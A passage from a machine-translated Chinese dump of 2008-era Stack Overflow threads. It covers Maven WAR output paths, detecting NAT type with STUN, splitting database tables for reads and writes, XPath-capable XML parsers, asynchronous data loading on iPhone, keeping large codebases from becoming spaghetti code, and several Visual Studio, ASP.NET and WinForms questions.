感谢以上所有答案。

下面的答案对我有用。这只是一个合并的。没什么特别的！

```
</project>
 ........ 
   <build>
    <finalName>HelloWorld1</finalName>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId> 
            <artifactId>maven-war-plugin</artifactId>
            <configuration>
                <outputDirectory>C:\Program Files (x86)\apache-tomcat-8.5.8\webapps\</outputDirectory>
            </configuration>
        </plugin>
    </plugins>
  </build>
</project> 
```

> 了解更多信息。更多信息请参考[dependency:copy](http://maven.apache.org/plugins/maven-dependency-plugin/copy-mojo.html)官方页面。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-04-19T02:05:04.573

您也可以使用[依赖插件执行此操作](http://maven.apache.org/plugins/maven-dependency-plugin/copy-mojo.html)

# java - 如何发现给定接口后面的 NAT 类型

> ID：369664
> 
> 赞同：4
> 
> 时间：2008-12-15T20:53:50.233
> 
> 标签：java, python, nat, discovery

我想发现给定网络接口后面的 NAT 类型（FullCone、Restricted Cone、Port Restricted cone、Symmetric）。

我测试了不同的工具（[http://freshmeat.net/projects/jstun/](http://freshmeat.net/projects/jstun/)，[http://code.google.com/p/boogu/](http://code.google.com/p/boogu/)），但它们针对同一界面报告了不同的结果。

我正在寻找 Python （或其他语言，第二选择是 Java，如果没有其他可用的话）的明确答案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-08-09T03:23:17.553

我支持@S.Lott 的回答：不可能使用 STUN（或任何其他协议）来 100% 确定您所使用的 NAT 类型。

问题是（正如我最近所看到的）NAT 有时可能充当[地址相关](https://www.rfc-editor.org/rfc/rfc4787#section-4.1)（对称），有时充当[端点独立](https://www.rfc-editor.org/rfc/rfc4787#section-4.1)（完整、受限或端口受限锥形）。

当您考虑它时，地址依赖意味着当您从 NAT 后面的客户端上的一个套接字发送数据包到两个不同的服务器时，NAT 将为每个服务器创建两个自定义的公共地址：端口元组。在我的例子中，这些绑定看起来是完全随机的，但如果范围很小，有时这些元组实际上是相等的！这使测试感到困惑。

我当时正在使用[这个库](http://www.stunprotocol.org/)，有时它告诉我 NAT 的行为与地址相关，有时它与端点无关（两者之间的切换似乎也完全随机，有时在我重新启动设备后发生，有时在一个时间段，...）。

这发生在我使用[Slovak Telekom](http://en.wikipedia.org/wiki/Slovak_Telekom)的移动设备上，这家公司主要由[Deutsche Telekom](http://en.wikipedia.org/wiki/Deutsche_Telekom)所有，所以我认为问题至少会出现在整个欧洲。

我想说这里的规则是这样的：如果 STUN 测试告诉你你在对称 NAT 后面，那么情况就是这样，但如果它告诉你不是这样，那么你就不能 100% 确定。

最后一点，检查 NAT 与 TCP 相关的行为的一种简单方法是在 google 中输入“我的 IP 地址是什么”，然后首先打开（比如说）五个页面。如果页面与您的 IP 地址**不一致**，则您的 NAT 的行为是地址相关或地址和端口相关（对称）。但同样，如果他们确实对应，你只是不能确定。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T21:25:30.890

[http://en.wikipedia.org/wiki/STUN](http://en.wikipedia.org/wiki/STUN)

> NAT 设备在许多不同类型的地址和端口映射方案中实现。STUN 不适用于所有这些。

这足够确定吗？这只是维基百科的引用，但从这里看来，您的请求在物理上是不可能的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-03-12T06:30:48.953

正如@S.Lott 所说，STUN 是您的首选协议。

然后，STUN 只是一个协议。这是我的建议：

1 **STUN**现在有两个版本：旧版本是[RFC3489](http://www.ietf.org/rfc/rfc3489.txt) - 这是一个轻量级协议，允许应用程序发现它们与公共 Internet 之间的 NAT 和防火墙的存在和类型（因此它主要且仅用于检测 NAT 类型）；新版本是[RFC5389——](http://www.ietf.org/rfc/rfc5389.txt)这是其他协议处理NAT穿越的工具。

2 还有一个名为**TURN** [RFC5766](http://www.ietf.org/rfc/rfc5766.txt)的 STUN 中继扩展。TURN 允许主机控制中继的操作并使用中继与其对等方交换数据包。TURN 与其他一些中继控制协议的不同之处在于它允许客户端使用单个中继地址与多个对等方通信。

工具：

*   STUN 服务器 (RFC3489) : [stund](http://sourceforge.net/projects/stun) By c++
*   STUN 客户端 (RFC3489) : [pystun](http://code.google.com/p/pystun/) By python

*   TURN 服务器 (RFC5766) : [turnserver](http://turnserver.sourceforge.net) By c

*   TURN 客户端 (RFC5766) : [turn-client](https://github.com/node/turn-client)由 c 和 python

注意：由于 TURN 是新版本 STUN 的扩展，TURN 服务器也支持 RFC5389 的新 STUN 请求。

# sql - DB 设计：拥有 2 个表（一个针对读取进行了优化，一个针对写入进行了优化）会提高性能吗？

> ID：369665
> 
> 赞同：2
> 
> 时间：2008-12-15T20:54:14.010
> 
> 标签：sql, database-design

我正在考虑一个数据库设计问题。

例如，我正在设计这个 stackoverflow 网站，其中有一个问题列表。

每个问题都包含某些可能不会改变的元数据。每个问题还包含将不断变化的某些数据（最近查看日期、总查看次数...等）

有一个主表来读取常量元数据并进行连接并将变化的值保存在不同的表中会更好吗？

或者

将所有东西都放在一张桌子上会更好吗？

我不确定是否是这种情况，但是在更新时，ROW 是否锁定？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-15T21:07:20.113

在设计数据库结构时，最好先进行[规范化](http://en.wikipedia.org/wiki/Database_normalization)，然后在对查询进行概要分析和基准测试后更改性能。规范化旨在防止数据重复、提高完整性并定义数据之间的正确关系。

请记住，执行连接也是有代价的，因此很难说您的想法是否会有所帮助。使用规范化结构进行正确索引会更有帮助。

关于行级锁，这取决于存储引擎——一些使用行级锁，一些使用表锁。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T21:17:31.200

您的初始数据库设计应仅基于概念和关系考虑，完全独立于物理考虑。数据库软件旨在支持良好的关系设计。您几乎不需要放松这些考虑来处理性能。一开始甚至不要考虑连接、锁定和活动类型的成本。然后再进一步，推迟这些考虑，直到探索完所有其他途径。

您的 rdbms 是您的朋友，而不是您的对手。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T21:12:54.033

您应该将两个表分开，因为您可能想要记录问题的历史。主 Question 表按问题 ID 进行索引，然后 Status 表按查询 ID 和日期/时间戳进行索引，并且每次状态更改时都包含一行。

不知道更新真的很重要，除非您使用悲观锁定，该行将被锁定一段时间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T21:15:30.580

我会考虑在本地使用 Asp.net 缓存或使用 MemCached 来缓存您的结果。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T21:17:00.517

如果您使用 Oracle，这肯定是个坏主意。在 Oracle 中，由于它的多版本并发控制，您可以在其他会话正在修改它们时非常愉快地读取记录。您将因连接而遭受额外的性能损失，而不会节省任何费用。

然而，一种有用的设计模式是使用物化视图预连接表、预计算聚合或预应用 where 子句。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-15T21:29:01.897

如前所述，最好从干净的标准化设计开始。以后去规范化比反过来更容易。经验告诉你，你永远不会非规范化那张大桌子！您只需根据需要添加更多列。而且您将需要越来越多的索引，并且更新会越来越慢。

您还应该查看预期负载：会有更多新答案还是更多查询？你还会有哪些其他操作？在优化方面，您可以使用 dbms 系统的功能：索引、视图、...

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T21:33:16.350

Eran Galperin 已经提供了我的大部分答案。此外，您提出的结构在锁定方面确实对您没有帮助。如果它们是同一行中的相对静态和动态属性，则将静态和动态分成两个表并没有多大好处。静态数据是否被锁定并不重要，因为无论如何都没有人试图改变它。

事实上，这种设计实际上可能会做得更糟。一些数据库引擎使用页面锁定。如果一个表的列更少/更小，则页面上将容纳更多行。页面上的行数越多，锁争用的可能性就越大。通过将静态数据与动态数据混合，行更大，因此页面中的行更少，因此页面锁定的等待更少。

如果您有两组独立的动态属性，并且它们通常由不同的参与者修改，那么您可以通过将它们分成不同的表来获得一些好处。然而，这是一个非常不寻常的案例。

我还要指出，将表分成静态和动态部分在相对较小的环境中可能没有好处，但在大型分布式环境中，以不同于静态的速率缓存和复制动态数据可能很有用数据。

# xml - 寻找 XML 解析器

> ID：369675
> 
> 赞同：0
> 
> 时间：2008-12-15T20:58:33.157
> 
> 标签：xml, dom, xpath, parsing

我的任务是寻找一个开源的 DOM XML 解析器。解析器必须至少支持 XPath 1.0。需要模式支持，但不是交易破坏者

我们正在解析的文件会很小，所以速度和内存消耗不是一个大问题。

任何 OO 语言（C++、C#、Java 等）。

澄清一下，该计划是将 XML 解析器集成到应用程序中，比使用外部解析器更紧密。我们正在创建一个基于 XML 的自适应对象模型（更改 XML，更改对象模型）。为此，我们需要在相当低的级别上集成解析器。这导致了需要体验才能理解的优雅水平（谢谢 Yoder 先生）。如果我们不能通过 XPath 导航这个对象模型，那么这种优雅的一部分就会消失。

我们创建了一个使用操作系统提供的解析器的原型。它工作得很好，但存在复杂性和性能问题。但是，嘿，这是一个原型。现在我想做真正的事情，我可以从头开始编写解析器。（我已经完成了那部分，这很容易。）现在，XPath 引擎是另一回事了。我很确定我不会在周末完成这项工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T14:15:12.723

永远优秀的[Jaxen](http://jaxen.codehaus.org/)在这里可能对你有用。它是用于 JDom 和 Dom4J 的 Java XPath 实现。

在重构出遍历两个 DOM 实现的通用功能时，您现在拥有一个可以查询任何树形模型的 XPath 引擎。你只需要写他们所谓的导航器，写起来比较简单。

从[常见问题解答](http://jaxen.codehaus.org/faq.html)：

> 如何支持不同的对象模型？
> 
> 唯一需要的是接口 org.jaxen.Navigator 的实现。并非所有接口都是必需的，并且还提供了 org.jaxen.DefaultNavigator 形式的默认实现。
> 
> 由于许多 XPath 轴可以相互定义（例如，祖先轴只是递归应用的父轴），因此只需几个低级轴迭代器即可开始使用。当然，你可以直接实现它们，而不是依赖 jaxen 的组合能力。

我发现写这些相对较快。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T21:09:38.127

为了很好地回答这个问题，我认为您需要提供更多上下文。话虽如此，我发现支持 Linq to XML 的 .NET 3.5 中用于 XML 的新对象模型（XElement 等）极大地促进了 XML 导航，我的意思是比使用 DOM 更容易和更好的一个数量级

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-16T00:05:48.570

如果您允许 C#，那么您不会有可用的 C# 标准库吗？他们有缺陷吗？

java也一样？而这一切都始于 C++。我不明白缺乏。

谷歌搜索“XML parser XPATH”可以找到很多 CPAN、JDOM 和 J2SE、cocoa、MSXML 等的匹配项。

您是刚从这里开始搜索，还是标准答案不足？

编辑：

您的说明向我表明您不想使用它，您想使用源代码在您自己的 XML 解析器中启动您自己的 XPATH 模块吗？那是对的吗？而且您不关心语言，因为您想要的只是设计，而不是代码？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-16T20:07:46.397

如果您想要的只是设计逻辑而不是代码，您可以研究 Ruby 的 REXML 库。它是面向对象的，非常好，并且具有完整的 XPath 支持。

MRI 在 C 和 Ruby 中有一个实现。JRuby 在 Java 中有一个实现。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-17T04:16:46.923

可能有点远，但 jQuery 显然支持 XPath 语法来引用 DOM；我认为它的源代码是可以访问的。

# iphone - 处理变量赋值和异步请求

> ID：369678
> 
> 赞同：3
> 
> 时间：2008-12-15T20:59:06.293
> 
> 标签：iphone, cocoa, cocoa-touch, asynchronous

我正在寻找一种可靠的设计来处理涉及异步请求的分配。为了进一步澄清，我有一个处理数据管理的类。它是一个单例，包含很多对我来说的顶级数据，这些数据在我的 iPhone 应用程序中使用。

视图控制器可能会执行以下操作：

```
users = [MySingleton sharedInstance].users; 
```

然后 MySingleton 将覆盖合成的用户 getter 并查看它是否已设置。如果未设置，它将与触发异步请求的连接管理器（NSURLConnection 及其委托方法的包装器）对话，这就是问题开始的地方。我无法保证“用户”何时可用。我可以将请求更改为同步，但这会直接影响用户体验，尤其是在带宽已经有限的移动环境中。

我需要能够在某个时候在我的 getter 中进行某种锁定/同步代码，直到它可用或为零时才会返回用户。

一旦 NSURLConnection 有可用的数据，它需要用响应对象回调某处/某处，并让 getter 知道数据可用..无论它是失败还是成功。

关于处理这个有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-16T03:15:22.647

我在不同的应用程序中通过几种方式解决了这个问题。

一种解决方案是传递一个对象和选择器来通知，例如：

```
- (id)getUsersAndNotifyObject:(id)object selector:(SEL)selector 
```

然而，这打破了良好的属性行为。如果要将方法保留为属性，请让它们立即返回，使用缓存数据或 nil。如果您需要上网，请异步执行此操作，然后让应用程序的其余部分知道通过 KVO 或 NSNotificationCenter 更改的数据。（可可绑定将是 Mac 上的一个选项，但它们在 iPhone 上不存在）。

这两种方法非常相似。使用您的共享实例注册更新，然后请求数据。如果您只处理原始的可观察属性，KVO 的重量会稍微轻一些，但是如果您对几个不同的数据感兴趣，则 NSNotification 可能会更方便。

使用 NSNotification，客户端对象可以注册一种类型的通知，其中包括其 userInfo 字典中的更改数据，而不必为您感兴趣的每个键路径注册观察服务器。

与直接 KVO 相比，NSNotification 还允许您更轻松地回传故障或其他状态信息。

KVO方法：

```
// register observer first so you don't miss an update
[[MySingleton sharedInstance] addObserver:self
                               forKeyPath:@"users"
                                  options:(NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld)
                                  context:&kvo_users_context];
 users = [MySingleton sharedInstance].users;

 // implement appropriate observeValueForKeyPath:ofObject:change:context: method 
```

NSNotification 方法：

```
 [[NSNotificationCenter defaultCenter] addObserver:self
                                          selector:@selector(sharedDataChanged:)
                                              name:MySingletonDataUpdatedNotification
                                            object:[MySingletonDataUpdatedNotification sharedInstance]];
 users = [MySingleton sharedInstance].users;

 // implement appropriate sharedDataChanged: method 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T21:51:13.833

您可以在此处使用委托模式或通知模式。

当用户完成时，委托会通知特定对象，通知模式会通知任何想知道的对象。两者都有效，具体取决于您的情况。

请记住：如果您的应用程序中有任何种族问题，那么您的架构可能全都错了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-07-01T23:52:32.953

我花了一段时间才意识到处理这种典型任务的最佳方式是什么；事实证明，线索在于许多 Cocoa 和 CocoaTouch 自己的 API 的设计：**委托**。

很多 Cocoa 的 API 使用委托的原因是因为它非常适合许多 GUI 应用程序的异步特性。

想要做一些类似的事情似乎是完全正常的：

```
users = [MyDataFactory getUsers]; 
```

除了，正如您所指出的，您不知道该`getUsers`方法何时完成。现在，有一些轻量级的解决方案；**amrox**在上面的帖子中提到了一些（我个人认为通知不太合适，但 object:selector: 模式是合理的），但如果你经常做这种事情，委托模式往往会产生一个更优雅的解决方案。

我将尝试通过一个示例来解释我如何在我的应用程序中做事。

假设我们有一个域类，`Recipe`. 食谱是从 Web 服务中获取的。我通常有一系列*存储库*类，一个用于我模型中的每个实体。存储库类的职责是获取实体（或它们的集合）所需的数据，使用该数据构造对象，然后将这些对象传递给其他对象以使用它们（通常是控制器或数据源）。

我的`RecipeRepository`界面可能看起来像这样：

```
@interface RecipeRepository {}
- (void)initWithDelegate:(id)aDelegate;
- (void)findAllRecipes;
- (void)findRecipeById:(NSUInteger)anId;
@end 
```

然后我会为我的代表定义一个协议；现在，这可以作为非正式或正式协议来完成，每种方法的优缺点与此答案无关。我将采用正式的方法：

```
@protocol RepositoryDelegateProtocol
- (void)repository:(id)repository didRetrieveEntityCollection:(NSArray *)collection;
- (void)repository:(id)repository didRetrieveEntity:(id)entity;
@end 
```

您会注意到我采用了通用方法；您的应用程序中可能会有多个`XXXRepository`类，并且每个类都将使用相同的协议（您也可以选择提取一个`EntityRepository`封装了一些通用逻辑的基类）。

现在，要在控制器中使用它，例如，您以前会在其中执行以下操作：

```
- (void)viewDidLoad 
{
  self.users = [MySingleton getUsers];
  [self.view setNeedsDisplay];
} 
```

你会做这样的事情：

```
- (void)viewDidLoad 
{
  if(self.repository == nil) { // just some simple lazy loading, we only need one repository instance
    self.repository = [[[RecipeRepository alloc] initWithDelegate:self] autorelease];
  }
  [self.repository findAllRecipes];
}

- (void)repository:(id)repository didRetrieveEntityCollection:(NSArray *)collection;
{
  self.users = collection;
  [self.view setNeedsDisplay];
} 
```

您甚至可以进一步扩展它以使用附加委托方法显示某种“加载”通知：

```
@protocol RepositoryDelegateProtocol
- (void)repositoryWillLoadEntities:(id)repository;
@end

// in your controller

- (void)repositoryWillLoadEntities:(id)repository;
{
  [self showLoadingView]; // etc.
} 
```

这种设计的另一件事是，您的存储库类实际上不需要是单例的——它们可以在您需要的任何地方实例化。他们可能会处理某种单例连接管理器，但在这一抽象层，单例是不必要的（尽可能避免使用单例总是好的）。

这种方法有一个缺点。您可能会发现在每个级别都需要多层授权。例如，您的存储库可能与执行实际异步数据加载的某种连接对象交互；存储库可能会使用它自己的委托协议与连接对象进行交互。

因此，您可能会发现您必须在应用程序的不同层中“冒泡”这些委托事件，使用的委托越接近您的应用程序级代码，就越粗粒度。这可以创建一个间接层，使您的代码更难遵循。

无论如何，这是我对 SO 的第一个回答，希望对您有所帮助。

# iphone - 在 iPhone 上为高分提交设置名称输入框的示例？

> ID：369680
> 
> 赞同：0
> 
> 时间：2008-12-15T20:59:36.917
> 
> 标签：iphone, objective-c

有没有人有一个设置文本字段的例子，用户可以在其中输入他们的姓名和/或电子邮件地址以在线提交到高分数据库？我希望它类似于当您尝试从 AppStore 下载内容时弹出的表单，您在其中输入您的电子邮件和密码，然后可以点击 OK 或 Cancel。我可以处理网站上的所有提交代码和服务器端处理，但我只是在正确设置文本字段和按钮方面花了很多时间。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-17T21:21:33.767

这将显示对话框，但我不确定如何使其响应：

```
[dialog setDelegate:self];
[dialog setTitle:@"Enter Name"];
[dialog addButtonWithTitle:@"Cancel"];
[dialog addButtonWithTitle:@"OK"];
UITextField * nameField = [[UITextField alloc] initWithFrame:CGRectMake(20.0, 45.0, 245.0, 25.0)];
[nameField setBackgroundColor:[UIColor whiteColor]];
[dialog addSubview:nameField];
CGAffineTransform moveUp = CGAffineTransformMakeTranslation(0.0, 100.0);
[dialog setTransform: moveUp];
[dialog show]; 
```

# coding-style - 多年来有没有办法避免意大利面条代码？

> ID：369683
> 
> 赞同：48
> 
> 时间：2008-12-15T21:00:12.763
> 
> 标签：coding-style, maintenance

我有几个编程工作。每个有 20-50 名开发人员，项目进行 3-5 年。

每次都是一样的。有些程序员很聪明，有些程序员很普通。每个人都有自己的 CS 学位，每个人都读过设计模式。意图是好的，人们正在努力编写好的代码，但几年后代码还是变成了意大利面条。模块 A 的更改突然破坏了模块 B。代码中总是有这些部分，除了编写它的人之外，没有人能理解。更改基础架构是不可能的，并且向后兼容性问题阻止了良好的功能进入。一半的时间你只想从头开始重写所有内容。

比我更有经验的人认为这是正常的。是吗？它必须是吗？我能做些什么来避免这种情况，或者我应该接受它作为生活的事实吗？

编辑：伙计们，我对这里的回复数量和质量印象深刻。这个网站和它的社区摇滚！

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2008-12-15T21:06:17.043

无情的勤奋与不断的单元测试相结合是防止意大利面条式代码的唯一方法。即便如此，这也只是一个创可贴的解决方案。一旦你停止注意，意大利面就会出现。

我经常发现引入意大利面条代码是因为那天有人很懒惰。他们知道有更好的方法可以做到这一点，只是没有时间。当你看到这种情况发生时，只有一件事要做。

**打电话给他们并要求他们改变它**

我发现在代码审查期间指出更好的方法通常足以让人们继续前进。如果他们签入并且我感觉很强烈，我会自己重构它。

我偶尔会显得有点古怪吗？我确定我会的。坦率地说，虽然我不介意。我不是一个混蛋，并以最好的社交方式处理这个问题。然而，让错误的代码被签入几乎可以确保我在将来的某个时候必须对其进行调试。我宁愿现在稍微接受一下，然后输入正确的代码。

我还觉得单元测试文化也有助于防止意大利面条式代码。对分解良好的代码的意大利面条代码进行单元测试要困难得多。随着时间的推移，这迫使人们在一定程度上保留他们的代码。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2008-12-15T23:20:13.560

我相信避免代码腐烂的关键在于健全的自下而上的设计和实现方法（我坚信这一点，因此我将我的业务命名为 - Think Bottom Up - 在它之后！）。这里选择的工具是：

*   合约编程
*   分层设计
*   专注于脱钩
*   始终考虑重用，寻找通用解决方案
*   保持框架轻量、简单和专注

正如其他受访者所建议的，您需要及早发现问题。对于绿色开发人员，这意味着指导（结对编程在这里很棒）和审查（代码和设计审查）。对于更高级的开发人员，这意味着保持警惕。

最重要的是，不要害怕重构。如果重构让你感到害怕，那么你已经沉没了。如果重构被认为是“坏的”，那么你的业务就出了问题。

当您修复某些东西时，请正确修复它。我使用术语“fux”来描述以错误方式完成的修复：它只是“fux”了您的代码库。

干杯，

担

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2008-12-15T21:03:46.500

20 到 50 名开发人员可能是问题所在。这是相当高的，需要大量的管理和资源来控制一切。

我会考虑将项目分成更小的可重用部分。从核心系统中抽象出某些层。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2008-12-15T21:04:44.253

在代码的不同区域之间创建“防火墙”。为此，您可以定义不同的区域或代码层，并定义每个层响应的单个 API（在 Java 中，这通常通过接口完成）。应该有 API 使用的基本接口或类，但它们对这些层的内部“一无所知”。例如，gui 不应该知道或关心您如何存储数据，并且您的数据库不应该知道或关心数据如何呈现给最终用户。

这些 API 不必一成不变——您应该能够根据需要添加一些东西，只要您确保不会污染防火墙。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2008-12-15T21:08:22.373

我认为重点是当你说

> 您只想从头开始重写所有内容

只是拥抱它。
**尽可能多地使用单元测试，然后让重构成为一种常见的做法**。
自动化和单元测试将确保更改不会引入回归；将一定比例的时间用于重构旧代码（这意味着*更少的新功能*！）确保现有代码库不会变旧，或者至少不会那么快。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-12-15T21:15:26.837

代码审查、编码标准和公司政策。

以下适用于我们的店铺-由于我不知道您的店铺类型，您的里程可能会有所不同。在迁移到 Team Foundation Server 时，我们的大部分重点是保持代码质量 - 或至少以任何可能的方式帮助保持质量。我们添加的一些示例：

*   代码审查工作流程 - 强制执行代码审查作为流程的一部分。包含一项政策，如果代码未经审查，将阻止签入。
*   TeamReview - 通过提供完整的“IDE 内部”体验，减少代码审查的痛苦。
*   Check-in Policies (in general) - 许多很酷的好东西可用于控制代码流。例如确保在签入之前记录公共和受保护的方法，以确保在没有相应工作项的情况下无法签入任何工作。

就像我说的，如果您使用的是不同的平台，那么可用的工具和您可以做的可能会有所不同。但不排除以任何可能的方式提供帮助的工具。如果您可以使用它来改进、控制和审核您的工作流程以及在其中移动的项目，那么它至少应该值得考虑。

请记住，流程中的任何更改都将涉及回退。我们帮助缓解这一问题的方法是将策略构建到培训中，以便从旧的版本控制/缺陷跟踪系统过渡。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-12-15T21:07:40.130

听起来很多人没有遵循封装和良好设计的一些基本原则。

保持事物隔离且不依赖于其他部分对于避免您描述的问题至关重要。您可能需要一些更高级别的设计师或架构师。这是一个典型的场景，人们已经证明了一些严厉的流程和变更管理是合理的。（我不提倡）

您需要避免依赖和相互关系，并且只定义和使用公共接口。这当然是过于简单化了，但你可能会通过一些关于代码的指标来学习很多东西——类的复杂性、公共方法、通过对代码进行逆向工程构建的 UML 图等。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-12-15T21:09:13.450

我认为通过全面使用依赖注入可以获得的松散耦合是一项非常有用的技术特性。当您拆分应用程序的各个部分时，您不太可能因为“有趣的”重用而得到意大利面条。

相反，您可能会走向过度碎片化，但这是另一个问题，而不是全球结构性问题。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-12-15T22:27:42.307

软件行业最大的问题是编程代码的质量被视为一个主观问题。如果没有一些明确定义的指标，仅仅保持整洁和遵循惯例并不足以确保质量是可以接受的。

有人试图改变[这一点](http://theprogrammersparadox.blogspot.com/2008/11/code-normal-form.html)，但它们不太可能获得足够的兴趣或接受，主要是因为长期以来建立的程序员文化是非常努力地远离任何类似于工程的东西。编程的“纯艺术”哲学意味着您的 20 到 50 名开发人员都会以自己独特的方式对代码进行猛烈抨击，因此无论单个编码人员多么出色，团队努力的总和总是会达到成为“大泥球”。

为避免这种情况，要么将所有编码人员放在同一个“页面”上，将规范化代码作为约定的一部分，要么在开发团队较小（1-3 人）并且你是大人物的情况下追逐工作。总有一天，大团队可能会找到一种方法来构建更好的东西，但在那之前，即使是最优秀的团队也非常幸运，如果他们能接近 10 个中的 6 个。我们构建低质量的软件，因为这就是我们已经建立的我们的行业要做...

保罗。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2008-12-16T02:39:56.387

在至少有两双眼睛看到之前，不要让代码提交。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2008-12-15T21:06:26.637

您必须密切关注软件开发实践。必须进行代码审查和单元测试，不断确保更新会影响系统中的其他内容。20 - 50 名开发人员很多，但可以做到。实施良好的流程是在这种环境中拯救您的唯一方法。强制编码标准也是关键。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2008-12-15T21:06:38.367

**[重构](http://en.wikipedia.org/wiki/Code_refactoring)**

努力保持设计尽可能干净。这并不容易，但值得付出努力。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2008-12-15T21:09:00.673

我不认为这是正常的。当它在那里存在几年时，它真的很难与之抗争。

避免它的唯一方法是改变态度：

“敏捷开发人员对软件设计的态度与外科医生对无菌手术的态度相同。无菌程序使手术成为*可能*。没有它，感染的风险将高得无法忍受。敏捷开发人员对他们的设计也有同样的感受。即使是最微小的腐烂开始的风险也太高了，无法容忍。” Martin C. Robert “C# 中的敏捷原则、模式和实践”</p>

我强烈建议您查看这本书以获取建议。它列出了所有“设计气味”、它们存在的原因以及离开它们的后果。愿这将帮助您说服您的管理层当前的情况是不合适的。

祝你好运！

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-12-15T21:04:50.493

更多的代码审查，也许还有代码所有权。

如果您只是破解一些随机代码，那么您就不会像您“拥有”的代码那样关心。如果维护项目的一个模块是您的责任，那么您希望大放异彩。

代码审查是您展示代码的时候。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-12-15T21:08:09.520

跟踪系统各个部分的缺陷和性能将使您能够识别问题。随着系统的更改，设计不良或编写不良的功能或模块将具有更高的缺陷率。当识别出“问题”模块时，可以做出重写模块（而不是应用程序）的决定。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-12-15T21:13:37.277

持续重构。您*必须*随时进行重构，尤其是在设计级别。当您看到损坏的代码或设计时，请准备好修复它。这通常是修复一些本身没有损坏的东西的情况。除了它是……它只是没有表现出它的破碎……然而。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2008-12-18T16:02:40.773

[Shore 和 Warden 的*The Art of Agile Development*](https://rads.stackoverflow.com/amzn/click/com/0596527675)是一本很棒的书，其中有一节是关于“将 XP 应用于现有项目”（在第 4 章中）。除非您努力奋斗，否则项目会随着时间的推移变得更糟：克服此类技术债务很难，并且会越来越难以发布可接受的版本。唯一的解决方案是降低交付新功能的速度，并将节省的时间用于提高测试覆盖率和重构。

通常，项目没有太多的测试覆盖率，也没有选择运行一个 10 分钟的自动化脚本来非常彻底地构建和运行您的代码。相反，大多数代码都是结构化的，因此很难测试。最好的选择是在可能的情况下添加简单的测试覆盖，同时开始重构以使代码抽象化，以便更容易测试。

尽管团队需要花时间改进代码以使其干净且可测试，但您可能无法在“完成”清理所需的时间内停止交付。因此，您必须逐步完成，同时还要添加新功能。没关系，先选择最糟糕的领域，不要指望马上有明显的好处。坚持下去，因为最终你会到达那里。不要听那些说所有大项目都不好的声音。

简而言之，每周花一点时间整理一下，确保下周的代码比这周更好。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2008-12-15T21:09:30.810

开始创建单元测试，这将帮助您解耦代码并避免错误修复的后续错误。如果您有良好的覆盖范围，它也将使您更容易删除未使用的代码。

# visual-studio - 如何查看哪个源安全项目绑定到 Visual Studio 解决方案？

> ID：369689
> 
> 赞同：0
> 
> 时间：2008-12-15T21:01:51.280
> 
> 标签：visual-studio, visual-sourcesafe

是否可以验证哪个源安全项目绑定到我的 vs.net 解决方案？

当我在 vs.net 中签出一个文件，然后在源代码安全中查找该文件时，它似乎正在从另一个项目中签出一个文件。当我查看“设置工作文件夹”中的目录时，它似乎没问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T21:05:17.577

**File > Source Control > Change Source Control...**显示代码的绑定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T21:05:43.097

在Visual Studio中，在文件或编辑菜单下，（我认为是文件菜单）有一个菜单项，上面写着“源代码控制”......在下面，有一个名为“更改源代码控制”的子菜单。 .

# asp.net - 如果在 ASP .NET 中关闭了 Session，则获取 Session 开始信息

> ID：369693
> 
> 赞同：0
> 
> 时间：2008-12-15T21:02:52.463
> 
> 标签：asp.net, session, global-asax

我有一个 ASP .NET 信息，并且我目前关闭了会话状态，因此我不能完全挂钩 Global.asax 中的会话开始事件。我想获取这些数据，当有人访问站点时，以及他们通常何时开始会话。为了启动会话而触发的事件是什么，以便我可以挂钩并获取该数据？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T21:18:53.680

如果没有打开会话，那么**每个**请求都是一个新会话。所以无论你喜欢什么活动:)

除非您要删除充当会话 cookie 的 cookie，否则无法知道访问者之前是否去过那里。

# .net - Winforms + MDI 儿童

> ID：369696
> 
> 赞同：1
> 
> 时间：2008-12-15T21:04:01.773
> 
> 标签：.net, winforms, mdi

在 WinForms 中，有没有办法以某种智能的方式指定 MDI 子窗口的初始起始位置？

我可以应用手动位置，或者让它居中父级，但这些选项都没有考虑到现有窗口。

